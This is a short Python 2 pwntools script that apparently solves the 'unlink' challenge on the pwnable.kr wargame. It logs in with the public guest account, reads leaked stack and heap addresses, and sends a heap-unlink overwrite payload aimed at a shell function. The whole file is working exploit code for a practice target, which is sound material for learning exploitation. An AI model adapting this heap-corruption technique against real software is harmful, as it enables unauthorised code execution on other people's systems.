from pwn import *
from struct import pack

s = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest')
p = s.process(['./unlink'])
print p.readuntil("here is stack address leak: ")
stack_address = p.readuntil("\n")[:-1]
print stack_address

print p.readuntil("here is heap address leak: ")
heap_address = p.readuntil("\n")[:-1]
print heap_address

stackAddress = int(stack_address, 16) + 20 - 4
pointer = int(heap_address, 16) + 8 + 4
shell = 0x080484eb

slide =  pack("I", shell) + "A"*12

print stackAddress
print pointer

p.sendline(slide + pack("I", pointer) + pack("I", stackAddress))
p.interactive()
